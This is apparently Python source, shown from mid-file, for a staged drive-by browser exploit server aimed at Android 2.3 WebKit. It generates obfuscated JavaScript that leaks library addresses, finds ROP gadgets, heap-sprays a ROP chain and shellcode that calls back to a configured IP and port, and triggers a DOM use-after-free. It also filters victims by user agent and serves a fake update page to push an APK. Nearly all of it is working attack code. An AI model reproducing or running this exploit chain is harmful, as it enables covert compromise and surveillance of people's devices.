f(d==9){if(data.charCodeAt(f).toString(16)=="6801"&&data.charCodeAt(f+1).toString(16)=="6bca"&&data.charCodeAt(f+2).toString(16)=="1c29"&&data.charCodeAt(f+3).toString(16)=="4790"){return(l+f*2).toString(16)}}else{if(d==10){if(data.charCodeAt(f).toString(16)=="bc0c"&&data.charCodeAt(f+1).toString(16)=="4690"&&data.charCodeAt(f+2).toString(16)=="4699"&&data.charCodeAt(f+3).toString(16)=="bdf0"){return(l+f*2).toString(16)}}else{if(d==11){if(data.charCodeAt(f).toString(16)=="7812"&&data.charCodeAt(f+1).toString(16)=="1c20"&&data.charCodeAt(f+2).toString(16)=="9904"&&data.charCodeAt(f+3).toString(16)=="4798"){return(l+f*2).toString(16)}}else{if(d==12){if(data.charCodeAt(f).toString(16)=="47a0"&&data.charCodeAt(f+1).toString(16)=="6828"&&data.charCodeAt(f+2).toString(16)=="6947"&&data.charCodeAt(f+3).toString(16)=="1c28"&&data.charCodeAt(f+4).toString(16)=="47b8"){return(l+f*2).toString(16)}}}}}}}}}}}}}}c+=a;l+=b;m+=b}return null};
        
'''


        page += '''
function come_un_poco_di_raggio(){v=os();js=engine();if(!js||v[0]!=2||v[1]!=3){return}mm=mr(36988,2);a=mm.charCodeAt(1).toString(16);b=4096;l_b_a=parseInt(a+b.toString(16),16);mm=m_s(l_b_a,36864,36864,1);hn=true;cso=parseInt(mm,16);lbr=new Array();while(hn){var d=mr(cso,64);name_buf="";for(i=0;i<64&&d.charCodeAt(i).toString(16)!=0;i++){name_buf+=d.charCodeAt(i).toString(16)}var d="";for(i=0;i<name_buf.length;i+=4){c=parseInt(name_buf[i+2]+name_buf[i+3],16);c=String.fromCharCode(c);d+=c;c=parseInt(name_buf[i]+name_buf[i+1],16);c=String.fromCharCode(c);d+=c}var h=mr(cso+140,2);a=h.charCodeAt(1).toString(16);b=h.charCodeAt(0).toString(16);if(b=="0"){h=a+"0000"}else{h=a+b}var j=mr(cso+160,2);a=j.charCodeAt(1).toString(16);b=j.charCodeAt(0).toString(16);if(b=="0"){j=a+"0000"}else{j=a+b}var f=mr(cso+164,2);f=f.charCodeAt(1).toString(16)+f.charCodeAt(0).toString(16);if(d.substr(0,5)=="libc."){lbr[0]=["libc",h,j,cso]}else{if(d.substr(0,11)=="libwebcore."){lbr[1]=["libwebcore",h,j,cso]}}if(f==0){hn=false}else{cso=parseInt(f,16)}}if(lbr.length!=2){return}wbc_b=parseInt(lbr[1][1],16);wbc_s=parseInt(lbr[1][2],16)-wbc_b;wbc_s_a=lbr[1][3];cacciando_il_lupo[5]=wbc_s_a.toString(16);lbc_b=parseInt(lbr[0][1],16);lbc_sz=parseInt(lbr[0][2],16)-lbc_b;quivi_mori=m_s(wbc_b+589824,1048576,1048576,2);if(quivi_mori==null){quivi_mori=m_s(wbc_b,589824,589824,2)}var k=null;if(quivi_mori!=null){k=1;cacciando_il_lupo[0]=quivi_mori;mio_viso_stallo=m_s(lbc_b,lbc_sz,lbc_sz/2,3);cacciando_il_lupo[1]=mio_viso_stallo;ir_mi_convenga=m_s(wbc_b+3145728,wbc_s-3145728,(wbc_s-3145728)/4,4);if(ir_mi_convenga==null){ir_mi_convenga=m_s(wbc_b,3145728,1048576,4)}cacciando_il_lupo[2]=ir_mi_convenga;poscia_passati=m_s(lbc_b,lbc_sz,lbc_sz/2,5);cacciando_il_lupo[3]=poscia_passati;ahi_genovesi=m_s(wbc_b,wbc_s,wbc_s/2,6);cacciando_il_lupo[4]=ahi_genovesi}else{cacciando_il_lupo[8]=cacciando_il_lupo[5];k=2;cocito=m_s(wbc_b+1572864,wbc_s-1572864,1048576,7);if(cocito==null){cocito=m_s(wbc_b,1572864,1048576,7)}cacciando_il_lupo[0]=cocito;cocito=m_s(lbc_b,lbc_sz,131072,8);cacciando_il_lupo[1]=cocito;cocito=m_s(wbc_b+458752,wbc_s-458752,1048576,9);if(cocito==null){cocito=m_s(wbc_b,458752,7340041,9)}cacciando_il_lupo[2]=cocito;cocito=m_s(wbc_b+2752512,wbc_s-3145728,1048576,10);if(cocito==null){cocito=m_s(wbc_b,2752512,2752512,10)}cacciando_il_lupo[3]=cocito;cocito=m_s(wbc_b+589824,wbc_s-589824,1048576,11);if(cocito==null){cocito=m_s(wbc_b,589824,589824,11)}cacciando_il_lupo[4]=cocito;cocito=m_s(wbc_b+2293760,wbc_s-2293760,1048576,12);if(cocito==null){cocito=m_s(wbc_b,2293760,1048576,12)}cacciando_il_lupo[5]=cocito;poscia_passati=m_s(lbc_b,lbc_sz,131072,5);cacciando_il_lupo[6]=poscia_passati;ahi_genovesi=m_s(wbc_b,wbc_s,wbc_s/2,6);cacciando_il_lupo[7]=ahi_genovesi}var e=new XMLHttpRequest();e.onreadystatechange=function(){if(e.readyState==4){p=B.b(e.responseText, document.body.id);scr=document.createElement("script");scr.language="javascript";scr.type="text/javascript";scr.defer=true;scr.text=p;head=document.getElementsByTagName("head").item(0);head.appendChild(scr);setTimeout("s_avea_messi_dinanzi_da_la_fronte()",1000)}};'''

        page += 'e.open("POST","customer.cfm",false);'
        
        page += '''e.setRequestHeader("Content-type","application/x-www-form-urlencoded");params=":"+k;for(g in cacciando_il_lupo){params+=":"+cacciando_il_lupo[g]}params="customer=id"+params;e.send(params)}var elem1=document.getElementById("ad1");var pld="";var queste_misere_carni=new Array();var cacciando_il_lupo=new Array();setTimeout("come_un_poco_di_raggio()",100);
</script>
</body>
</html>
'''

        open("leak_dump.html", 'w').write(page)

        return page


    def generate_browser_exploit(self, chain, gadgets):
        

        page = ''

        if chain == 1:
            for i in gadgets:

                if i != 3 and i != 5 : # skip mprotect and wbc_s_a
                    gadgets[i] = hex((int(gadgets[i], 16) + 1))[2:]

                gadgets[i]= '\u' + gadgets[i][4:8] + '\u' + gadgets[i][0:4]
             
            

            self.gadget_set_r7 				= gadgets[0]
            self.gadget_mov_r7_sp			= gadgets[1]
            self.gadget_rop_call_mprotect_jump_payload 	= gadgets[2]
            self.mprotect_address			= gadgets[3] 
            self.coe_return				= gadgets[4]
            self.wbc_s_a                        = gadgets[5]

        

        

            page += '''

 function occhi_vergognosi_e_bassi()
        {
          document.write("Come d'autunno si levan le foglie");
          for (i = 0; i < 0x40; i ++) 
            document.write("<br/>");

          nop = unescape("\u4242\u4242");

          i=0
          while( i < 3 ) {
	   nop += unescape("\u4242\u4242");
	   i++;
          }

          nop += unescape("\u2000\u5000"); 
          nop += unescape("\u4141\u4141"); 
        '''
         
        
            page += 'nop += unescape("{}");'.format(self.gadget_set_r7) # RELOC 1

            page +=  '''
    nop += unescape("\u4242\u4242"); 
    nop += unescape("\u4242\u4242"); 
    nop += unescape("\u2000\u5000"); 
    nop += unescape("\u4242\u4242"); 
    '''

            page += 'nop += unescape("{}");'.format(self.mprotect_address) # RELOC 4 

            page +=  '''
  
    nop += unescape("\u1000\u4ff0"); 
    nop += unescape("\u1000\u0100"); 
    nop += unescape("\u4141\u4141"); 
    '''


            page += 'nop += unescape("{}");'.format(self.gadget_rop_call_mprotect_jump_payload ) # RELOC 2  webcore

            page += '''

    nop += unescape("\u4848\u4848\u4848\u4848\u4848\u4848"); 
    nop += unescape("\u1001\ue28f\uff11\ue12f"); 
    nop += unescape("\u46c0\u2702"); 
    nop += unescape("\udf01\u2800");
    nop += unescape("\ud00a\u2000"); 
    nop += unescape("\u4669\u3950");    
    nop += unescape("\u468d\u4641");    
    nop += unescape("\u466e\u46c5");
    nop += unescape("\ub00e\ua321");    
    nop += unescape("\u681b\u4718"); 
    nop += unescape("\u46c0\u2002\u2101\u1a92\u020f\u3719\udf01\u2800\udb2d");
    nop += unescape("\u1c06\ua118\u2210\u3702\udf01\u2800\udb26\u46b1"); 
    nop += unescape("\ua219\u8812\u467d\ua51c\u1c29\u4648\u2703\udf01\u4684\u46c0\u46c0"); 
    nop += unescape("\ua112\u6809\u1c2a\u2300");
    nop += unescape("\u6810\u4048\u6010\u3304\u3204\u4563\udbf8\u46c0"); 
    nop += unescape("\ua10f\u6809\u1c08\ua310\u681b\u18c9\u2200\ua30d\u681f\udf01\ua109\u6809\ua30c\u3301\u4718");
    nop += unescape("\u2701\udf01");
    nop += unescape("\u46c0\u46c0\u46c0");

    '''
    #                              \u3412  \ua8c0\u8345
            page += 'nop += unescape("\u0002{}{}");'.format(self.socket_port, self.ip) #// sockaddr dl

            #print 'port: ' , self.socket_port , ' ip: ', self.ip

            page += 'nop += unescape("{}");'.format(self.coe_return)  #// end loop - coe jump address
    
            #print 'coe: ', self.coe_return

            page += 'nop += unescape("{}");'.format(self.xor_key)  #// key
    
            #print 'Key: ' , self.xor_key

            page += '''
    nop += unescape("\u0400\u0101"); 
    '''
         
            page += 'nop += unescape("{}");'.format(self.wbc_s_a)

            page += 'nop += unescape("\u1000\u4ff0");'  # flush base_address

            page += 'nop += unescape("\u0002\u000f");' # flush r7 value

            page += 'nop += unescape("\u1000\u1000");' # flush size

            page += '''

    while( nop.length < 0xc0)
	nop += unescape("\u4848\u4848");
    nop += unescape("\u4242\u4242");
    nop += unescape("\u4242\u4242");
    nop += unescape("\u4747\u4747");
    while( nop.length < 0x100)
	nop += unescape("\u4242\u4242");
    
    payload = "";
    padding = "";

    padding += unescape("\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444");

    payload += unescape("\u2020\u5000\u4545\u4545\u4545\u4545\u20a4\u5000"); 
    payload += unescape("\u2030\u5000");

    '''
                        
            page += 'payload += unescape("\uffff\u4fff\uffff\u4fff\uffff\u4fff\u2080\u5000\u0707\u0707{}\u4fff\u4fff");'.format(self.gadget_mov_r7_sp) #// RELOC 3 - mov r7,  sp
 
            page += '''
    payload += unescape("\u7777\u7777\u0722\u7777\u0210\u4f00\u20a8\u5000\u7777\u7777\u7777\u7777\uffff\uffff\u7777\u7777\u7777\u7777");
    payload += unescape("\u1ff0\u5000"); 
    payload += unescape("\ub650\uafd0"); 

    head = payload ;
    tail = padding + payload;


    tail = tail + nop.substring(0, nop.length - tail.length);
    head = head + nop.substring(0, nop.length - head.length - 0x1c);

    while( tail.length < 0x10000 ) 
	tail += tail;

    payload = head + tail.substring(0, tail.length - head.length);


    for (i = 0; i < 0x400; i ++) { 

        queste_misere_carni[i] = payload;
        document.write( queste_misere_carni[i]  + "</i>");
    }

    

}
'''

        elif chain == 2:

            for i in gadgets:
            
                if i != 6 and i != 8: # skip mprotect and wbc_s_a
                    gadgets[i] = hex((int(gadgets[i], 16) + 1))[2:] # thumb +1

                gadgets[i]= '\u' + gadgets[i][4:8] + '\u' + gadgets[i][0:4]
            


            self.gadget_c2_set_r7       = gadgets[0]
            self.gadget_c2_set_sp       = gadgets[1]
            self.gadget_c2_useless      = gadgets[2]
            self.gadget_c2_set_r2       = gadgets[3]
            self.gadget_c2_set_r1       = gadgets[4]
            self.gadget_c2_final        = gadgets[5]
            self.gadget_c2_mprotect     = gadgets[6]
            self.gadget_c2_coe_return   = gadgets[7]
            self.wbc_s_a        = gadgets[8]

            page += '''

function occhi_vergognosi_e_bassi()
{
    document.write("Come d'autunno si levan le foglie.");
    for (i = 0; i < 0x40; i ++) 
        document.write("<br/>");


    nop = unescape("\u4242\u4242");

    i=0
    while( i < 4 ) {
	nop += unescape("\u4242\u4242");
	i++;
    }

    nop += unescape("\u4141\u4141"); 
    nop += unescape("\u99b7\ua83c"); 
    nop += unescape("\u4242\u4242"); 
    nop += unescape("\u4242\u4242"); 
    nop += unescape("\u2000\u5000");
    nop += unescape("\u4242\u4242");
    nop += unescape("\ub650\uafd0");
    nop += unescape("\u2000\u5000"); 
    nop += unescape("\u1000\u0001"); 
    nop += unescape("\u4646\u4646"); 
    nop += unescape("\uf137\ua862"); 
    nop += unescape("\u4848\u4848\u4848\u4848\u4848\u4848"); 
'''
            page += 'nop += unescape("\u4848\u4848{}\u4848\u4848");'.format(self.gadget_c2_set_r2); 

            page += '''
    nop += unescape("\u4848\u4848\u0007\uf000");
'''

            page += 'nop += unescape("\u20b8\u5000{}");'.format(self.gadget_c2_set_sp)

            page +=  '''
    nop += unescape("\u2000\u5000\u4848\u4848");
    nop += unescape("\u4949\u4949\u20e8\u5000");
'''
            page += 'nop += unescape("{}");'.format(self.gadget_c2_set_r1)
            
            page += '''

    nop += unescape("\u4848\u4848\u4848\u4848\u4848\u4848"); 
    nop += unescape("\u4848\u4848\u1000\u0001\u20e8\u5000\u4848\u4848"); 
'''

            # $7
            page += 'nop += unescape("{}\u20ec\u5000\u2110\u5000");'.format(self.gadget_c2_mprotect)  

            page += 'nop += unescape("{}\u4848\u4848\u4848\u4848\u4848\u4848");'.format(self.gadget_c2_final)

            page += '''

    nop += unescape("\u1001\ue28f\uff11\ue12f"); 
    nop += unescape("\u46c0\u2702"); 
    nop += unescape("\udf01\u2800");
    nop += unescape("\ud00a\u2000"); 
    nop += unescape("\u4669\u3950");    
    nop += unescape("\u468d\u4641");    
    nop += unescape("\u466e\u46c5");
    nop += unescape("\ub00e\ua321");    
    nop += unescape("\u681b\u4718"); 
    nop += unescape("\u46c0\u2002\u2101\u1a92\u020f\u3719\udf01\u2800\udb2d"); 
    nop += unescape("\u1c06\ua118\u2210\u3702\udf01\u2800\udb26\u46b1");
    nop += unescape("\ua219\u8812\u467d\ua51c\u1c29\u4648\u2703\udf01\u4684\u46c0\u46c0"); 
    nop += unescape("\ua112\u6809\u1c2a\u2300");
    nop += unescape("\u6810\u4048\u6010\u3304\u3204\u4563\udbf8\u46c0"); 
    nop += unescape("\ua10f\u6809\u1c08\ua310\u681b\u18c9\u2200\ua30d\u681f\udf01\ua109\u6809\ua30c\u3301\u4718");
    nop += unescape("\u2701\udf01");
    nop += unescape("\u46c0\u46c0\u46c0");

    '''
    #                              \u3412  \ua8c0\u8345
            page += 'nop += unescape("\u0002{}{}");'.format(self.socket_port, self.ip) #// sockaddr dl

            #print 'port: ' , self.socket_port , ' ip: ', self.ip

            page += 'nop += unescape("{}");'.format(self.gadget_c2_coe_return)  #// end loop - coe jump address
    
            #print 'coe: ', self.gadget_c2_coe_return

            page += 'nop += unescape("{}");'.format(self.xor_key)  #// key
    
            #print 'Key: ' , self.xor_key

            page += '''
    nop += unescape("\u0400\u0101");
    '''
         
            page += 'nop += unescape("{}");'.format(self.wbc_s_a)

            page += 'nop += unescape("\u1000\u4ff0");'  # flush base_address

            page += 'nop += unescape("\u0002\u000f");' # flush r7 value

            page += 'nop += unescape("\u1000\u1000");' # flush size


            page += '''
   

    while( nop.length < 0xc0)
	nop += unescape("\u4848\u4848");
    
    nop += unescape("\u4242\u4242");
    nop += unescape("\u4242\u4242");
    nop += unescape("\u4747\u4747");


    while( nop.length < 0x100)
	nop += unescape("\u4242\u4242");
    
    payload = "";
    padding = "";


    padding += unescape("\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444\u4444");

    payload += unescape("\u2004\u5000"); 
    payload += unescape("\u61f5\uafd1\u4545\u4545\u20a4\u5000"); 

'''
            page += 'payload += unescape("\u63fb\uafd1");'.format(self.gadget_c2_set_sp)

            page += 'payload += unescape("\u1000\u0001\u2094\u5000{}\u2080\u5000\u2000\u5000\uffff\uafd1");'.format(self.gadget_c2_useless)


            page += '''
    payload += unescape("\u5555\u5555");

    payload += unescape("\u7777\u7777\u1007\u1000\u0210\u4f00\u20a8\u5000");
'''

            page += 'payload += unescape("{}\u7777\u7777\uffff\uffff\u7777\u7777\u7777\u7777");'.format(self.gadget_c2_set_sp)


            page += '''
    payload += unescape("\u1ff0\u5000"); 
'''

            page += 'payload += unescape("{}");'.format(self.gadget_c2_set_r7)

            page += '''
    head = payload ;
    tail = padding + payload;


    tail = tail + nop.substring(0, nop.length - tail.length);
    head = head + nop.substring(0, nop.length - head.length - 0x1c);


    while( tail.length < 0x10000 ) 
	tail += tail;

    payload = head + tail.substring(0, tail.length - head.length);


    for (i = 0; i < 0x300; i ++) { 

        queste_misere_carni[i] = payload;
        document.write( queste_misere_carni[i]  + "</i>");
    }

    

}

'''


        else:
            logging.debug('Wrong chain number')


        # common to both the chains
        page += '''

function fsb(b){var c=unescape("\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u2000\u5000\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u4343");for(i=0;i<b;i++){document.write(c);document.write("<br />")}}function nouseforme(){for(i=0;i<4100;i++){a=0.5}}function handler1(){randomware=1024;occhi_vergognosi_e_bassi();for(i=0;i<randomware;i++){name="b"+i;elem1.removeAttribute(name)}fsb(randomware)}function s_avea_messi_dinanzi_da_la_fronte(){nouseforme();fsb(1024);for(i=0;i<1024;i++){name="b"+i;elem1.setAttribute(name,"A")}elem1.attributes[0].appendChild(document.createTextNode("hi"));elem1.attributes[0].addEventListener("DOMSubtreeModified",handler1,false);for(i=0;i<1024;i++){elem1.normalize()}};

'''

        # crypt the page
        while( len(page) % 4 != 0 ):
            page += ' '

        page = base64.b64encode( self.tea.encrypt(page) )
        
        open('exploit_dump.html', 'w').write(page)
        
        return page


# end of class Exploit

class ExploitHTTPHandler(BaseHTTPServer.BaseHTTPRequestHandler):


    exploit_instances = {}

    @staticmethod
    def is_exploit_running(exploit_id):

        try:
            status = open('{}/setup.txt'.format(exploit_id)).readline().split(':')[1].strip()

            print 'STATUS: {}'.format(status)

            if status == 'running' and exploit_id in ExploitHTTPHandler.exploit_instances.keys():
                return True
            else:
                return False
        except IOError:
            return False
    
                      
    @staticmethod
    def is_request_on_target(user_agent):
        match = re.match('.*Android ((\d\.)+)', user_agent)

        try:
            on_target = match.group(1) == '2.3.' 

            if on_target:
                return True
            else:
                return False

        except AttributeError:
            return False

    @staticmethod    
    def get_exploit_id_from_request(path):

        # each request must start with ^/news/0123456789/
        # extract the exploit id, i.e. 10 digits sequence
        match = re.match('^/news/(\d{10})/', path)

        if match != None:
            return match.group(1)
        else:
            return None

            #logging.debug('Wrong request - no exploit id: {}'.format(path))
            
            



    def do_POST(self):
        
        path = urlparse.urlparse(self.path).path
        
        # POST requests must start with ^/news/0123456789/
        # extract the exploit id, i.e. 10 digits sequence

        exploit_id = ExploitHTTPHandler.get_exploit_id_from_request(path)
        if exploit_id == None:
            self.send_initial_redirect()
            return

        # 1] assert the exploit is runnable
        if not ExploitHTTPHandler.is_exploit_running(exploit_id):
            self.send_initial_redirect()
            return

        
        if re.match('^/news/(\d{10})/customer.cfm$', path) != None:

            # legacy..
            firstStageSuccessful = False
            gadgets = {}

            current_exploit = ExploitHTTPHandler.exploit_instances[exploit_id]

            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD':'POST', 
                         'CONTENT': self.headers['Content-Type'] } )


            for field in form.keys():
                field_item = form[field]

            
                if field_item.name == 'customer':
                    gadgets_retrieved = field_item.value.split(':')[1:]
                

                    chain = int(gadgets_retrieved[0])
                    gadgets_retrieved = gadgets_retrieved[1:]

                    logging.info( 'Retrieved: {}'.format(gadgets_retrieved) )

                    
                    if chain == 1:
                        
                        logging.debug('Chain 1')
                        LOG['chain'] = 1
                        
                        # sanitize
                        i = 0
                        for g in gadgets_retrieved:

                            # gadget not found TODO: test 
                            if ( len(g) > 8 or  g == 'null' ):
                                ExploitHTTPHandler.send_empty_reply()
                             
                                LOG['exploit_fail_reason'] =  'Invalid gadget: {}'.format(g)

                                return
                    
                            gadgets[i] = g
                            i+=1
                
                        if len(gadgets_retrieved) != 6:
                            firstStageSuccessful = False
                            ExploitHTTPHandler.send_empty_reply()

                            logging.debug('Not enough gadgets {}'.format( len(gadgets_retrieved) ) )
                            LOG['exploit_fail_reason'] = 'Not enough gadgets: {}'.format(len(gadgets_retrived))
                            return


                        # generate browser 2nd stage with the gadgets retrieved
                        firstStageSuccessful = True;
                        page = current_exploit.generate_browser_exploit(1, gadgets)
                        logging.debug('Chain 1: Second stage generated, sending')
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(page)

                        # release lock and let the 3rd stage server start
                        try:
                            print '>>> R ' + current_exploit.exploit_id
                            current_exploit.socket_server_lock.release()
                        except Exception as e:
                            print e

                        LOG['exploit_time'] = time.ctime()
                        logging.debug('Chain 1: Second stage sent: {}'.format(time.ctime()) )
                        


                    elif chain == 2:
                        logging.debug('Chain 2')
                        LOG['chain'] = 2

                        # sanitize
                        i = 0
                        for g in gadgets_retrieved:

                            # gadget not found TODO: test 
                            if ( len(g) > 8 or  g == 'null' ):
                                ExploitHTTPHandler.send_empty_reply()
                                logging.debug('Invalid gadget {}'.format( g ))
                                LOG['exploit_fail_reason'] =  'Invalid gadget: {}'.format(g)
                                return
                    
                            gadgets[i] = g
                            i+=1
                
                        if len(gadgets_retrieved) != 9:
                            firstStageSuccessful = False
                            ExploitHTTPHandler.send_empty_reply()
                            
                            logging.debug('Not enough gadgets {} '.format( len(gadgets_retrieved) ) )
                            LOG['exploit_fail_reason'] = 'Not enough gadgets: {}'.format(len(gadgets_retrived))

                            return


                        # generate browser 2nd stage with the gadgets retrieved
                        firstStageSuccessful = True;
                        page = current_exploit.generate_browser_exploit(2, gadgets)

                        logging.debug( 'Chain 2: Second stage generated, sending' )

                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(page)

                        # release lock and let the 3rd stage server start
                        current_exploit.socket_server_lock.release()

                        LOG['exploit_time'] = time.ctime()
                        logging.debug( 'Chain 2: second stage sent: {}'.format(time.ctime()) )

                    # unknown chain number
                    else:
                        firstStageSuccessful = False
                        ExploitHTTPHandler.send_empty_reply()
                        return
                        

                else:
                    firstStageSuccessful = False
                    ExploitHTTPHandler.send_empty_reply()
                    return

        else:
            firstStageSuccessful = False
            self.send_initial_redirect()
            return


  


    def do_GET(self):

        path = urlparse.urlparse(self.path).path

        #f = open('path.txt', 'a')
        #f.write(path + '\n')
        #f.close()


        
        # 1] no user agent requests
        if path == '/favicon.ico':
            return

        # receive phone vendor from injected so
        # format /news/0123456789/rep?%s
        if re.match('^/news/(\d{10})/rep', path) != None: 
            
            # dupe code, not nice
            match = re.match('^/news/(\d{10})/', path)
            exploit_id = match.group(1)

            logging.debug('Recived REP for {}'.format(exploit_id))

            # before receiving this request we don't know whether the social stuff 
            # was already successful, so do not consider setup.txt status
            if not exploit_id in ExploitHTTPHandler.exploit_instances :
                self.send_initial_redirect()
                return
                
            # generate only, do not send anything
            current_exploit = ExploitHTTPHandler.exploit_instances[exploit_id]
            current_exploit.local_report = base64.b64decode(urlparse.urlparse(self.path).query)
            current_exploit.fakevendor = current_exploit.local_report.strip().split("!")[0]
            current_exploit.update_page = current_exploit.generate_update_page()
            

        # 2] fetch user agent
        # fetch user agent
        # requests above don't have a user-agent necessarily
        try:
            userAgent =  self.headers['User-agent']
        except KeyError:
            return

        logging.debug('User Agent {}'.format(userAgent))
        LOG['user_agent'] = userAgent


        # 3] determine if request is in target
        on_target = ExploitHTTPHandler.is_request_on_target(userAgent)
        
        # if not on_target check whether there's an exploit_id in the request
        # and serve the page without the exploit, otherwise google.com
        
        if not on_target:
 
            match = re.match('^/news/(\d{10})/', path)
            
            if match != None:
                exploit_id =  match.group(1)

                if ExploitHTTPHandler.is_exploit_running(exploit_id):
                    current_exploit = ExploitHTTPHandler.exploit_instances[exploit_id]
                    
                    logging.debug('Sending redirect page')
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(current_exploit.exploitless_landing_page)
                    logging.debug('Wrong browser request {} for active exploit {}'.format(userAgent, exploit_id) )
                    
                

                logging.debug('Wrong request {} no running exploit id: {}'.format(path, exploit_id))

            logging.debug('Wrong user-agent {} exploit not active {}'.format(userAgent, path))
            self.send_initial_redirect()
            return
    
        

    
        # 4] Process on target requests
        # from here onwards browser is on target    

        else: 

            logging.debug('Request: {}'.format( path ) )
            
        
            # redirect page format: ^/news/0123456789/page.cfm$
            
            if re.match('^/news/(\d{10})/page.cfm$', path) != None:

                exploit_id = ExploitHTTPHandler.get_exploit_id_from_request(path)
                assert exploit_id != None, 'This is weird' # if condition guarantees exploit_id exists
                    
                logging.debug('Exploit id is {}'.format(exploit_id))


                # 1] verify folder '0123456789' exists..
                if not os.path.exists(exploit_id):
                    logging.debug('Exploit folder does not exist: {}'.format(exploit_id))
                    self.send_initial_redirect()
                    return
                                
                try:
                    setup = open('{}/setup.txt'.format(exploit_id), 'r+')
                except IOError:
                    logging.debug('{}/setup.txt not found'.format(exploit_id) )
                    self.send_initial_redirect()
                    return

                # if status[1].strip() == 'finished':
                #     logging.debug('Exploit {} has already been deployed'.format(exploit_id))
                #     self.send_initial_redirect()
                #     return

                
                status = setup.readline().split(':')

                logging.info('Exploit {} status is {}'.format(exploit_id, status))

                # ..if the exploit is already running we're cool, 
                # otherwise create create the Exploit instance
                
                if status[1].strip() == 'off': 
                    
                    #  setup.txt format:
                    #1 status:running
                    #2 requests:6
                    #3 ip:192.168.69.229
                    #4 so:0123456789_libfingerprint.so
                    #5 landing:landing.html
                    #6 redirect:redirect.html

                    setup.seek(0)
                    setup.readline() #1
                    setup.readline() #2
                    ip = setup.readline().split(':')[1].strip() #3
                    so = setup.readline().split(':')[1].strip() #4
                    landing_page  = setup.readline().split(':')[1].strip() #5
                    redirect_page = setup.readline().split(':')[1].strip() #6

                    # find a free socket port
                    used_socket_ports = []

                    for e in ExploitHTTPHandler.exploit_instances:
                        used_socket_ports.append(ExploitHTTPHandler.exploit_instances[e].socket_port_normalized)

                    # awful
                    found = False
                    while not found:
                        candidate_port = random.randrange(2000, 65000)

                        if not candidate_port in used_socket_ports:
                            found = True

                    logging.debug('Found socket port {} for exploit {}'.format(candidate_port, exploit_id))

                                        
                    # update setup.txt
                    setup.flush()
                    setup.seek(0)
                    setup.write('status:running\n')
                    setup.flush()

                    # add the new Exploit instance
                    ExploitHTTPHandler.exploit_instances[exploit_id] = Exploit( ip, candidate_port, so, exploit_id, landing_page, redirect_page)

                    # start socket server
                    current_exploit = ExploitHTTPHandler.exploit_instances[exploit_id]
                    print '>>> A 1' + current_exploit.exploit_id
                    current_exploit.socket_server_thread = threading.Thread(target=current_exploit.socket_server)
                    current_exploit.socket_server_lock = threading.Lock()
                    current_exploit.socket_server_lock.acquire() 
                    current_exploit.socket_server_thread.start()
                    

                elif status[1].strip() == 'running':
                    logging.debug('Exploit {} is already running'.format(exploit_id))

                    if exploit_id in ExploitHTTPHandler.exploit_instances.keys():
                        current_exploit = ExploitHTTPHandler.exploit_instances[exploit_id]

                        # close old socket, free the port
                        try:
                            current_exploit.socket_server_lock.release()
                            current_exploit.socket.shutdown(socket.SHUT_RDWR)
                            current_exploit.socket.close()
                        except:
                            logging.debug('Issues while releasing socket lock {}, should be fine'.format(exploit_id))
                    
                        # respawn socket_server
                        print '>>> A 2' + current_exploit.exploit_id
                        current_exploit.socket_server_thread = threading.Thread(target=current_exploit.socket_server)
                        current_exploit.socket_server_lock = threading.Lock()
                        current_exploit.socket_server_lock.acquire() 
                        current_exploit.socket_server_thread.start()


                # the apk has been server, as far as this exploit_id is concerned
                # we do serve only the social web page
                elif status[1].strip() == 'finished':
                    logging.debug('Exploit {} is in finished state'.format(exploit_id))
                    self.send_initial_redirect()
                    return
                    


                else:
                    logging.debug('Exploit {} malformed setup.txt'.format(exploit_id))
                    self.send_initial_redirect()
                    return


                # from now onwards the exploit has been set up / running

                # fetch exploit instance
                if not exploit_id in ExploitHTTPHandler.exploit_instances.keys():
                    logging.debug('Can\'t find {} among exploit instances'.format(exploit_id))
                    self.send_initial_redirect()
                    return
                
                current_exploit = ExploitHTTPHandler.exploit_instances[exploit_id]

                # update requests number
                #setup.flush()
                #setup.seek(0) # start of file
                #setup.readline() # skip 'status' line
                #setup_position = setup.tell()
                #requests_number = setup.readline().split(':')[1]
                #setup.seek(0) # dunno why doesn't work with setup_position
                #setup.readline()
                #setup.write('requests:{}\n'.format(int(requests_number) + 1))
                #setup.flush()

                
                # 3] generate redirect page
                logging.debug('Sending redirect page')
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(current_exploit.redirect_page)
                logging.debug('First request: {}'.format(time.ctime()) )
                LOG['first_request_time'] = time.ctime()

            # end of redirect page aka page.cfm


            elif re.match('^/news/(\d{10})/first.html$', path) != None:
                
                exploit_id = ExploitHTTPHandler.get_exploit_id_from_request(path)
                assert exploit_id != None, 'This is weird' # if condition guarantees exploit_id exists

                # assert the exploit is runnable, then serve the page
                if not ExploitHTTPHandler.is_exploit_running(exploit_id):
                    self.send_initial_redirect()
                    return

                current_exploit = ExploitHTTPHandler.exploit_instances[exploit_id]

                logging.debug('Sending first stage')
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(current_exploit.leak_page)
                logging.debug('Leak: {}'.format(time.ctime()) )
                LOG['leak_time'] = time.ctime()
            

            
            # don't check if exploit is in finshed state, because 'finished'
            # is set once the apk has been uploaded to the device
            # this is for the social attack, serve always if an exploit_id instance
            # exists
            elif re.match('^/news/(\d{10})/update.html$', path) != None: 

                exploit_id = ExploitHTTPHandler.get_exploit_id_from_request(path)
                assert exploit_id != None, 'This is weird' # if condition guarantees exploit_id exists


                if not exploit_id in ExploitHTTPHandler.exploit_instances.keys():
                    self.send_initial_redirect()
                    return

                current_exploit = ExploitHTTPHandler.exploit_instances[exploit_id]


                # if we already served the update page for this instance, redirect
                if current_exploit.update_html_served:
                    logging.debug('Update page for exploit {} already served'.format(exploit_id))
                    self.send_initial_redirect()
                    return
                
                # if the server didn't receive rep? query, update_page won't exist
                try:
                    update_page = current_exploit.update_page
                except AttributeError as ae:
                    logging.debug('Update page for exploit {} not generated yet'.format(exploit_id))
                    self.send_initial_redirect()
                    return
                    
                logging.debug('Sending update page')
